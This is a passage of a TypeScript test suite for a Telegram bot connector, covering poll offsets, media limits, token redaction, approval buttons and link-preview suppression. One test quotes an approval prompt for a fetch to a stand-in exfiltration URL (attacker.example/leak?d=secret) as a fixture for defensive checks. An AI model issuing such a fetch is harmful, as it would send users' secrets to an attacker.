    ).rejects.toThrow(/not running/);
  });

  it("delivers a scripted inbound text message through onInboundEvent, advancing the poll offset", async () => {
    let getUpdatesCalls = 0;
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/getUpdates")) {
        getUpdatesCalls += 1;
        const body = JSON.parse(String(init?.body)) as { offset?: number };
        if (getUpdatesCalls === 1) {
          expect(body.offset).toBeUndefined();
          return jsonResponse({
            ok: true,
            result: [
              {
                update_id: 100,
                message: { message_id: 5, date: 1_700_000_000, text: "hello bot", chat: { id: 7 }, from: { id: 9 } },
              },
            ],
          });
        }
        // Second call: assert the offset advanced past the delivered update, then hang.
        expect(body.offset).toBe(101);
        return hangUntilAborted(init?.signal ?? undefined);
      }
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch, pollErrorBackoffMs: 1 });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    const received: InboundEvent[] = [];
    instance.onInboundEvent?.(async (event) => {
      received.push(event);
    });
    await instance.start();
    await vi.waitFor(() => expect(received).toHaveLength(1));
    expect(received[0]).toMatchObject({
      connectionId: "conn-1",
      providerEventId: "bot:1:chat:7:msg:5",
      kind: "message",
      externalSenderId: "9",
      externalConversationId: "7",
      content: "hello bot",
    });
    await vi.waitFor(() => expect(getUpdatesCalls).toBeGreaterThanOrEqual(2));
    await instance.stop();
  });

  it("keeps the poll offset across stop() and start(), so a restart does not redeliver what was handled", async () => {
    const offsets: (number | undefined)[] = [];
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/getUpdates")) {
        offsets.push((JSON.parse(String(init?.body)) as { offset?: number }).offset);
        if (offsets.length === 1) {
          return jsonResponse({
            ok: true,
            result: [
              { update_id: 100, message: { message_id: 5, date: 1_700_000_000, text: "hello bot", chat: { id: 7 }, from: { id: 9 } } },
            ],
          });
        }
      }
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch, pollErrorBackoffMs: 1 });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    instance.onInboundEvent?.(async () => {});
    await instance.start();
    await vi.waitFor(() => expect(offsets).toHaveLength(2));
    await instance.stop();
    await instance.start();
    await vi.waitFor(() => expect(offsets).toHaveLength(3));
    expect(offsets[2]).toBe(101);
    await instance.stop();
  });

  it("never lets the token out through a failed media download", async () => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/getFile")) return jsonResponse({ ok: true, result: { file_path: "photos/file_1.jpg" } });
      if (url.includes("/file/bot")) throw new TypeError(`fetch failed for ${url}`);
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("secret-bot-token"),
    });
    await instance.start();
    const error = await instance.fetchMedia!({ ref: "file-1" }, { maxBytes: 100, signal: new AbortController().signal }).then(
      () => undefined,
      (thrown: unknown) => thrown as Error,
    );
    expect(error?.message).toContain("<redacted>");
    expect(error?.message).not.toContain("secret-bot-token");
    await instance.stop();
  });

  it("hands a photo or document over as media with its caption, and downloads it by file id within the cap", async () => {
    let getUpdatesCalls = 0;
    const fileUrls: string[] = [];
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/getUpdates")) {
        getUpdatesCalls += 1;
        if (getUpdatesCalls > 1) return hangUntilAborted(init?.signal ?? undefined);
        return jsonResponse({
          ok: true,
          result: [
            {
              update_id: 1,
              message: {
                message_id: 5,
                date: 1_700_000_000,
                caption: "my cat",
                photo: [
                  { file_id: "small", file_size: 10 },
                  { file_id: "large", file_size: 900 },
                ],
                chat: { id: 7 },
                from: { id: 9 },
              },
            },
            {
              update_id: 2,
              message: {
                message_id: 6,
                date: 1_700_000_000,
                document: { file_id: "doc", file_name: "a.pdf", mime_type: "application/pdf", file_size: 30 },
                chat: { id: 7 },
                from: { id: 9 },
              },
            },
            // A round video message, and an animation the Bot API also sends as a document: each taken once.
            {
              update_id: 3,
              message: {
                message_id: 7,
                date: 1_700_000_000,
                video_note: { file_id: "note", file_size: 40 },
                chat: { id: 7 },
                from: { id: 9 },
              },
            },
            {
              update_id: 4,
              message: {
                message_id: 8,
                date: 1_700_000_000,
                animation: { file_id: "anim", file_size: 50, mime_type: "video/mp4" },
                document: { file_id: "anim", file_name: "cat.gif.mp4", mime_type: "video/mp4", file_size: 50 },
                chat: { id: 7 },
                from: { id: 9 },
              },
            },
          ],
        });
      }
      if (url.includes("/getFile")) {
        const body = JSON.parse(String(init?.body)) as { file_id: string };
        return jsonResponse({ ok: true, result: { file_path: `photos/${body.file_id}.jpg` } });
      }
      if (url.includes("/file/bot")) {
        fileUrls.push(url);
        return new Response(new Uint8Array(url.includes("large") ? 900 : 10));
      }
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch, pollErrorBackoffMs: 1 });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    const received: InboundEvent[] = [];
    instance.onInboundEvent?.(async (event) => void received.push(event));
    await instance.start();
    await vi.waitFor(() => expect(received).toHaveLength(4));
    expect(received[0]).toMatchObject({ content: "my cat", media: [{ ref: "large", filename: "photo.jpg", sizeBytes: 900 }] });
    expect(received[2]?.media).toEqual([{ ref: "note", filename: "video_note.mp4", sizeBytes: 40 }]);
    expect(received[3]?.media).toEqual([{ ref: "anim", filename: "animation.mp4", mimeType: "video/mp4", sizeBytes: 50 }]);
    expect(received[1]).toMatchObject({ media: [{ ref: "doc", filename: "a.pdf", mimeType: "application/pdf", sizeBytes: 30 }] });
    expect(received[1]).not.toHaveProperty("content");
    const signal = new AbortController().signal;
    const small = await instance.fetchMedia!({ ref: "small" }, { maxBytes: 100, signal });
    expect(small instanceof Uint8Array ? small.byteLength : -1).toBe(10);
    expect(fileUrls).toEqual(["https://api.telegram.org/file/bottest-token/photos/small.jpg"]);
    // Past the cap the read stops, and the token is never in what is thrown.
    const refused = await instance.fetchMedia!({ ref: "large" }, { maxBytes: 100, signal }).then(
      () => "kept",
      (error: unknown) => String(error),
    );
    expect(refused).toMatch(/over 100|passed 100/);
    expect(refused).not.toContain("test-token");
    await instance.stop();
  });

  it("advances the offset past the last update in a multi-update getUpdates batch", async () => {
    let getUpdatesCalls = 0;
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/getUpdates")) {
        getUpdatesCalls += 1;
        if (getUpdatesCalls === 1) {
          return jsonResponse({
            ok: true,
            result: [
              { update_id: 100, message: { message_id: 5, date: 0, text: "first", chat: { id: 7 }, from: { id: 9 } } },
              { update_id: 101, message: { message_id: 6, date: 0, text: "second", chat: { id: 7 }, from: { id: 9 } } },
            ],
          });
        }
        const body = JSON.parse(String(init?.body)) as { offset?: number };
        expect(body.offset).toBe(102);
        return hangUntilAborted(init?.signal ?? undefined);
      }
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch, pollErrorBackoffMs: 1 });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    const received: InboundEvent[] = [];
    instance.onInboundEvent?.(async (event) => {
      received.push(event);
    });
    await instance.start();
    await vi.waitFor(() => expect(received).toHaveLength(2));
    await vi.waitFor(() => expect(getUpdatesCalls).toBeGreaterThanOrEqual(2));
    await instance.stop();
  });

  it("a handler exception degrades the loop instead of silently killing it — status recovers and later updates still arrive", async () => {
    let getUpdatesCalls = 0;
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/getUpdates")) {
        getUpdatesCalls += 1;
        if (getUpdatesCalls === 1) {
          return jsonResponse({
            ok: true,
            result: [{ update_id: 200, message: { message_id: 1, date: 0, text: "first", chat: { id: 7 }, from: { id: 9 } } }],
          });
        }
        if (getUpdatesCalls === 2) {
          return jsonResponse({
            ok: true,
            result: [{ update_id: 201, message: { message_id: 2, date: 0, text: "second", chat: { id: 7 }, from: { id: 9 } } }],
          });
        }
        return hangUntilAborted(init?.signal ?? undefined);
      }
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch, pollErrorBackoffMs: 1 });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    const received: InboundEvent[] = [];
    instance.onInboundEvent?.(async (event) => {
      if (event.providerEventId === "bot:1:chat:7:msg:1") throw new Error("downstream processing failed");
      received.push(event);
    });
    await instance.start();
    await vi.waitFor(() => expect(received).toHaveLength(1));
    expect(received[0]?.providerEventId).toBe("bot:1:chat:7:msg:2");
    expect(instance.status().state).toBe("running");
    await instance.stop();
  });

  it("does not advance the offset past an update whose handler threw, so the next poll redelivers it instead of skipping it forever", async () => {
    // The real, previously-missing half of the test above: this asserts
    // on the actual `getUpdates` `offset` parameter (not just on which
    // events eventually reach the handler), proving a failed update is
    // genuinely retried — not silently and permanently skipped, which is
    // what advancing the offset BEFORE the handler ran would do (updates are
    // persisted before the polling offset moves). Update 199 succeeds first so
    // there's a known prior offset to check "stayed put" against, rather
    // than the ambiguous `undefined` a fully-empty history would start at.
    let getUpdatesCalls = 0;
    let handlerAttempts = 0;
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/getUpdates")) {
        getUpdatesCalls += 1;
        const body = JSON.parse(String(init?.body)) as { offset?: number };
        if (getUpdatesCalls === 1) {
          expect(body.offset).toBeUndefined();
          return jsonResponse({
            ok: true,
            result: [
              { update_id: 199, message: { message_id: 1, date: 0, text: "ok", chat: { id: 7 }, from: { id: 9 } } },
              { update_id: 200, message: { message_id: 2, date: 0, text: "flaky", chat: { id: 7 }, from: { id: 9 } } },
            ],
          });
        }
        // Advanced past 199 (its handler succeeded) but NOT past 200 (its
        // handler threw) — 200 must be redelivered, not silently dropped.
        expect(body.offset).toBe(200);
        if (getUpdatesCalls === 2) {
          return jsonResponse({
            ok: true,
            result: [{ update_id: 200, message: { message_id: 2, date: 0, text: "flaky", chat: { id: 7 }, from: { id: 9 } } }],
          });
        }
        return hangUntilAborted(init?.signal ?? undefined);
      }
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch, pollErrorBackoffMs: 1 });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    const received: InboundEvent[] = [];
    instance.onInboundEvent?.(async (event) => {
      if (event.providerEventId === "bot:1:chat:7:msg:2") {
        handlerAttempts += 1;
        if (handlerAttempts === 1) throw new Error("downstream processing failed");
      }
      received.push(event);
    });
    await instance.start();
    await vi.waitFor(() => expect(received.map((e) => e.providerEventId)).toEqual(["bot:1:chat:7:msg:1", "bot:1:chat:7:msg:2"]));
    expect(handlerAttempts).toBe(2);
    await instance.stop();
  });

  it("with no inbound handler registered, an update is left unacknowledged rather than consumed with nobody to hand it to", async () => {
    // How every production inbound message used to be lost: the owning service
    // never registered a handler, and `handler?.(event)` still let the offset
    // move past the update.
    const offsets: (number | undefined)[] = [];
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/getUpdates")) {
        offsets.push((JSON.parse(String(init?.body)) as { offset?: number }).offset);
        if (offsets.length <= 2) {
          return jsonResponse({
            ok: true,
            result: [{ update_id: 300, message: { message_id: 1, date: 0, text: "anyone there?", chat: { id: 7 }, from: { id: 9 } } }],
          });
        }
        return hangUntilAborted(init?.signal ?? undefined);
      }
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch, pollErrorBackoffMs: 1 });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();

    // Asked again from the same (unset) offset, so Telegram keeps the update.
    await vi.waitFor(() => expect(offsets).toEqual([undefined, undefined, undefined]));
    await instance.stop();
  });

  it("refuses to start a second connection that resolves to a bot already running under a different connection (CONFLICT)", async () => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 42 } });
      return hangUntilAborted(init?.signal ?? undefined);
    });
    // ONE definition instance — the shared-registry scope that matters
    // (one receiver per bot across the configured deployment).
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const first = definition.createConnection({
      connection: { ...connectionFixture(), connectionId: "conn-a" },
      config: {},
      credentials: tokenCredentials("same-token"),
    });
    const second = definition.createConnection({
      connection: { ...connectionFixture(), connectionId: "conn-b" },
      config: {},
      credentials: tokenCredentials("same-token"),
    });
    await first.start();
    expect(first.status().state).toBe("running");

    await expect(second.start()).rejects.toThrow(/already running/);
    expect(second.status().state).toBe("failed");

    await first.stop();
  });

  it("releases the bot id on stop(), so a later connection for the same bot can start", async () => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 42 } });
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const first = definition.createConnection({
      connection: { ...connectionFixture(), connectionId: "conn-a" },
      config: {},
      credentials: tokenCredentials("same-token"),
    });
    const second = definition.createConnection({
      connection: { ...connectionFixture(), connectionId: "conn-b" },
      config: {},
      credentials: tokenCredentials("same-token"),
    });
    await first.start();
    await first.stop();

    await expect(second.start()).resolves.toBeUndefined();
    expect(second.status().state).toBe("running");
    await second.stop();
  });

  it("stop() aborts the in-flight poll request rather than only stopping future polls", async () => {
    let aborted = false;
    const fetchImpl = vi.fn((url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return Promise.resolve(jsonResponse({ ok: true, result: { id: 1 } }));
      // getUpdates: never resolves on its own; only rejects when the signal aborts.
      return new Promise<Response>((_resolve, reject) => {
        init?.signal?.addEventListener("abort", () => {
          aborted = true;
          reject(new DOMException("Aborted", "AbortError"));
        });
      });
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    await instance.stop();
    expect(aborted).toBe(true);
    expect(instance.status().state).toBe("stopped");
  });

  it("a getUpdates error keeps the poll loop alive (status recovers to running) rather than crashing it", async () => {
    let getUpdatesCalls = 0;
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/getUpdates")) {
        getUpdatesCalls += 1;
        if (getUpdatesCalls === 1) return jsonResponse({ ok: false, error_code: 502, description: "Bad Gateway" });
        return hangUntilAborted(init?.signal ?? undefined);
      }
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch, pollErrorBackoffMs: 1 });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    await vi.waitFor(() => expect(getUpdatesCalls).toBeGreaterThanOrEqual(2));
    expect(instance.status().state).toBe("running");
    await instance.stop();
  });

  it("a bot another consumer holds (409, a webhook is set) stays failed with the reason, not back to running", async () => {
    let getUpdatesCalls = 0;
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      if (url.includes("/getUpdates")) {
        getUpdatesCalls += 1;
        if (getUpdatesCalls === 1)
          return jsonResponse({ ok: false, error_code: 409, description: "Conflict: can't use getUpdates method while webhook is active" });
        return hangUntilAborted(init?.signal ?? undefined);
      }
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch, pollErrorBackoffMs: 1 });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    await vi.waitFor(() => expect(getUpdatesCalls).toBeGreaterThanOrEqual(2));
    expect(instance.status().state).toBe("failed");
    expect(instance.status().detail).toContain("webhook is active");
    await instance.stop();
  });

  it("probe() reports ok only while running, and reflects a real getMe call", async () => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    expect((await instance.probe()).ok).toBe(false);
    await instance.start();
    expect((await instance.probe()).ok).toBe(true);
    await instance.stop();
  });

  it("probe() names the bot and the chat a person opens to message it", async () => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 1, username: "tavi_test_bot" } });
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const instance = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch }).createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await instance.start();
    expect(await instance.probe()).toEqual({
      ok: true,
      detail: "Bot @tavi_test_bot.",
      setup: { lines: ["Bot @tavi_test_bot."], link: { label: "Open the chat", url: "https://t.me/tavi_test_bot" } },
    });
    await instance.stop();
  });
});

describe("interactive approvals", () => {
  /** A started instance whose `getUpdates` returns one batch, recording every other call's method and body. */
  async function started(updates: readonly unknown[]): Promise<{
    instance: MessagingConnectorInstance;
    calls: { method: string; body: Record<string, unknown> }[];
    received: InboundEvent[];
  }> {
    const calls: { method: string; body: Record<string, unknown> }[] = [];
    let polled = false;
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      const method = url.split("/").pop() ?? "";
      if (method === "getMe") return jsonResponse({ ok: true, result: { id: 1 } });
      if (method === "getUpdates") {
        calls.push({ method, body: JSON.parse(String(init?.body)) as Record<string, unknown> });
        if (!polled) {
          polled = true;
          return jsonResponse({ ok: true, result: updates });
        }
        return hangUntilAborted(init?.signal ?? undefined);
      }
      calls.push({ method, body: JSON.parse(String(init?.body)) as Record<string, unknown> });
      return jsonResponse({ ok: true, result: { message_id: 77, date: 0, chat: { id: 7 } } });
    });
    const definition = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch, pollErrorBackoffMs: 1 });
    const instance = definition.createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    const received: InboundEvent[] = [];
    instance.onInboundEvent?.(async (event) => {
      received.push(event);
    });
    await instance.start();
    return { instance, calls, received };
  }

  it("declares interactions and edits, and asks getUpdates for button presses", async () => {
    const definition = createTelegramConnectorDefinition();
    expect(definition.capabilities.interactions).toBe(true);
    expect(definition.capabilities.editOrProgress).toBe(true);
    const { instance, calls } = await started([]);
    await vi.waitFor(() => expect(calls.some((call) => call.method === "getUpdates")).toBe(true));
    expect(calls.find((call) => call.method === "getUpdates")?.body["allowed_updates"]).toEqual([
      "message",
      "callback_query",
      "my_chat_member",
    ]);
    await instance.stop();
  });

  it("keys a message by bot, chat and message id, so a restarted update_id sequence is not dropped as a duplicate", async () => {
    const { instance, received } = await started([
      { update_id: 1, message: { message_id: 40, date: 0, text: "before", chat: { id: 7 }, from: { id: 9 } } },
      { update_id: 1, message: { message_id: 41, date: 0, text: "after the sequence restarted", chat: { id: 7 }, from: { id: 9 } } },
    ]);
    await vi.waitFor(() => expect(received).toHaveLength(2));
    expect(new Set(received.map((event) => event.providerEventId)).size).toBe(2);
    await instance.stop();
  });

  it("keys by the bot the token belongs to, so a connection switched to another bot does not collide with the old one's messages", async () => {
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.includes("/getMe")) return jsonResponse({ ok: true, result: { id: 2 } });
      if (url.includes("/getUpdates") && JSON.parse(String(init?.body)).offset === undefined) {
        return jsonResponse({
          ok: true,
          result: [{ update_id: 1, message: { message_id: 5, date: 0, text: "hi", chat: { id: 7 }, from: { id: 9 } } }],
        });
      }
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const instance = createTelegramConnectorDefinition({ fetch: fetchImpl as unknown as typeof fetch }).createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    const received: InboundEvent[] = [];
    instance.onInboundEvent?.(async (event) => {
      received.push(event);
    });
    await instance.start();
    await vi.waitFor(() => expect(received).toHaveLength(1));
    expect(received[0]?.providerEventId).toBe("bot:2:chat:7:msg:5");
    await instance.stop();
  });

  it("skips a message that names no sender, rather than making the chat its sender", async () => {
    const { instance, received } = await started([
      { update_id: 1, message: { message_id: 50, date: 0, text: "no from", chat: { id: -100 } } },
      { update_id: 2, message: { message_id: 51, date: 0, text: "from a person", chat: { id: -100 }, from: { id: 9 } } },
    ]);
    await vi.waitFor(() => expect(received).toHaveLength(1));
    expect(received[0]).toMatchObject({ externalSenderId: "9", content: "from a person" });
    await instance.stop();
  });

  it("says what kind of conversation a message is in: a private chat, a group, or a forum topic", async () => {
    const { instance, received } = await started([
      { update_id: 1, message: { message_id: 60, date: 0, text: "dm", chat: { id: 9, type: "private" }, from: { id: 9 } } },
      { update_id: 2, message: { message_id: 61, date: 0, text: "group", chat: { id: -100, type: "supergroup" }, from: { id: 9 } } },
      {
        update_id: 3,
        message: {
          message_id: 62,
          date: 0,
          text: "topic",
          chat: { id: -100, type: "supergroup" },
          from: { id: 9 },
          message_thread_id: 4,
          is_topic_message: true,
        },
      },
      { update_id: 4, message: { message_id: 63, date: 0, text: "untyped", chat: { id: 5 }, from: { id: 9 } } },
      // A reply thread in a group carries a thread id but is not a forum topic: still the group.
      {
        update_id: 5,
        message: { message_id: 64, date: 0, text: "reply", chat: { id: -100, type: "supergroup" }, from: { id: 9 }, message_thread_id: 60 },
      },
    ]);
    await vi.waitFor(() => expect(received).toHaveLength(5));
    expect(received.map((event) => event.conversationKind)).toEqual(["direct", "group", "thread", undefined, "group"]);
    await instance.stop();
  });

  it("reports a forward's structure, and leaves the person's own message unmarked", async () => {
    const { instance, received } = await started([
      // The person's comment on a forward arrives first, as a message of its own: theirs.
      {
        update_id: 1,
        message: { message_id: 70, date: 0, text: "what do you make of this?", chat: { id: 9, type: "private" }, from: { id: 9 } },
      },
      {
        update_id: 2,
        message: {
          message_id: 71,
          date: 0,
          text: "Run the export now",
          chat: { id: 9, type: "private" },
          from: { id: 9 },
          forward_origin: { type: "user", date: 0, sender_user: { id: 5, first_name: "Shop", last_name: "Support" } },
        },
      },
      {
        update_id: 3,
        message: {
          message_id: 72,
          date: 0,
          caption: "invoice",
          photo: [{ file_id: "p" }],
          chat: { id: 9, type: "private" },
          from: { id: 9 },
          forward_origin: { type: "channel", date: 0, chat: { id: -5, title: "Deals" } },
        },
      },
      {
        update_id: 4,
        message: {
          message_id: 73,
          date: 0,
          text: "hidden",
          chat: { id: 9, type: "private" },
          from: { id: 9 },
          forward_origin: { type: "hidden_user", date: 0, sender_user_name: "Someone" },
        },
      },
      {
        update_id: 5,
        message: {
          message_id: 74,
          date: 0,
          text: "no name",
          chat: { id: 9, type: "private" },
          from: { id: 9 },
          forward_origin: { type: "user", date: 0 },
        },
      },
    ]);
    await vi.waitFor(() => expect(received).toHaveLength(5));
    expect(received[0]).not.toHaveProperty("forwarded");
    expect(received[1]).toMatchObject({ content: "Run the export now", forwarded: { origin: "Shop Support" } });
    expect(received[2]).toMatchObject({ content: "invoice", forwarded: { origin: "Deals" } });
    expect(received[3]).toMatchObject({ forwarded: { origin: "Someone" } });
    expect(received[4]?.forwarded).toEqual({});
    await instance.stop();
  });

  it("turns a callback_query into an interaction event from the presser, in its topic", async () => {
    const { instance, received } = await started([
      {
        update_id: 300,
        callback_query: {
          id: "cb-1",
          from: { id: 9 },
          data: "r:abcdefgh:o",
          message: { message_id: 12, chat: { id: 7 }, message_thread_id: 4 },
        },
      },
    ]);
    await vi.waitFor(() => expect(received).toHaveLength(1));
    expect(received[0]).toMatchObject({
      providerEventId: "bot:1:cb:cb-1",
      kind: "interaction",
      externalSenderId: "9",
      externalConversationId: "7",
      externalThreadId: "4",
      interaction: { data: "r:abcdefgh:o", callbackId: "cb-1", messageId: "12" },
    });
    await instance.stop();
  });

  it("marks a forum topic's message as a topic, and a reply thread's not", async () => {
    const { instance, received } = await started([
      {
        update_id: 310,
        message: {
          message_id: 20,
          date: 1,
          text: "in a topic",
          chat: { id: -100 },
          from: { id: 9 },
          message_thread_id: 4,
          is_topic_message: true,
        },
      },
      { update_id: 311, message: { message_id: 21, date: 1, text: "a reply", chat: { id: -100 }, from: { id: 9 }, message_thread_id: 20 } },
    ]);
    await vi.waitFor(() => expect(received).toHaveLength(2));
    expect(received[0]).toMatchObject({ externalConversationId: "-100", externalThreadId: "4", threadIsTopic: true });
    expect(received[1]).toMatchObject({ externalThreadId: "20" });
    expect(received[1]).not.toHaveProperty("threadIsTopic");
    await instance.stop();
  });

  it("keeps a message's forum topic in its reply destination", () => {
    const definition = createTelegramConnectorDefinition();
    expect(
      definition.destinationFromInbound?.(
        { externalConversationId: "7", externalSenderId: "9", externalThreadId: "4" },
        connectionFixture(),
      ),
    ).toEqual({ chatId: "7", threadId: "4" });
  });

  it("sends buttons as an inline keyboard in the topic, and refuses data over 64 bytes", async () => {
    const { instance, calls } = await started([]);
    const outcome = await instance.send({
      effectId: "e1",
      connectionId: "conn-1",
      destination: { chatId: 7, threadId: 4 },
      parts: [{ content: "approve?" }],
      buttons: [[{ label: "✅ Once", data: "r:abcdefgh:o" }], [{ label: "❌ Deny", data: "r:abcdefgh:d" }]],
    });
    expect(outcome.status).toBe("accepted");
    expect(calls.find((call) => call.method === "sendMessage")?.body).toMatchObject({
      message_thread_id: 4,
      reply_markup: {
        inline_keyboard: [[{ text: "✅ Once", callback_data: "r:abcdefgh:o" }], [{ text: "❌ Deny", callback_data: "r:abcdefgh:d" }]],
      },
    });
    await expect(
      instance.send({
        effectId: "e2",
        connectionId: "conn-1",
        destination: { chatId: 7 },
        parts: [{ content: "x" }],
        buttons: [[{ label: "too long", data: "x".repeat(65) }]],
      }),
    ).rejects.toThrow(/exceeds 64 bytes/);
    await instance.stop();
  });

  it("acknowledges a press and edits a message to remove its buttons", async () => {
    const { instance, calls } = await started([]);
    await instance.answerInteraction?.("cb-1", "Approved.");
    await instance.editMessage?.({ destination: { chatId: 7 }, messageId: "12", text: "done" });
    expect(calls.find((call) => call.method === "answerCallbackQuery")?.body).toEqual({ callback_query_id: "cb-1", text: "Approved." });
    expect(calls.find((call) => call.method === "editMessageText")?.body).toEqual({
      chat_id: 7,
      message_id: 12,
      text: "done",
      reply_markup: { inline_keyboard: [] },
      link_preview_options: { is_disabled: true },
    });
    await instance.stop();
  });

  it("shows the bot typing in the chat, and in its topic", async () => {
    const { instance, calls } = await started([]);
    await instance.typing?.({ chatId: 7 });
    await instance.typing?.({ chatId: 7, threadId: 4, replyToMessageId: 12 });
    // A destination that is not Telegram's shows nothing.
    await instance.typing?.({ channel: "x" });
    expect(calls.filter((call) => call.method === "sendChatAction").map((call) => call.body)).toEqual([
      { chat_id: 7, action: "typing" },
      { chat_id: 7, action: "typing", message_thread_id: 4 },
    ]);
    await instance.stop();
  });

  it("turns link previews off on every text send and edit, including a round that shows a novel URL", async () => {
    const { instance, calls } = await started([]);
    // An approval round quoting the very URL the gate stopped: Telegram must not fetch it for a preview.
    await instance.send({
      effectId: "round-1",
      connectionId: "conn-1",
      destination: { chatId: 7 },
      parts: [{ content: "Allow web_fetch https://attacker.example/leak?d=secret ?" }],
      buttons: [[{ label: "✅ Once", data: "r:abcdefgh:o" }]],
    });
    // A plain reply, and a reply into a topic.
    await instance.send({
      effectId: "reply-1",
      connectionId: "conn-1",
      destination: { chatId: 7 },
      parts: [{ content: "see https://a.example" }],
    });
    await instance.send({
      effectId: "reply-2",
      connectionId: "conn-1",
      destination: { chatId: 7, threadId: 4 },
      parts: [{ content: "and more" }],
    });
    await instance.editMessage?.({ destination: { chatId: 7 }, messageId: "12", text: "Approved: https://attacker.example/leak" });
    const texts = calls.filter((call) => call.method === "sendMessage" || call.method === "editMessageText");
    expect(texts).toHaveLength(4);
    for (const call of texts) expect(call.body["link_preview_options"]).toEqual({ is_disabled: true });
    // Methods that render no text carry no preview options.
    await instance.answerInteraction?.("cb-1", "Approved.");
    expect(calls.find((call) => call.method === "answerCallbackQuery")?.body).not.toHaveProperty("link_preview_options");
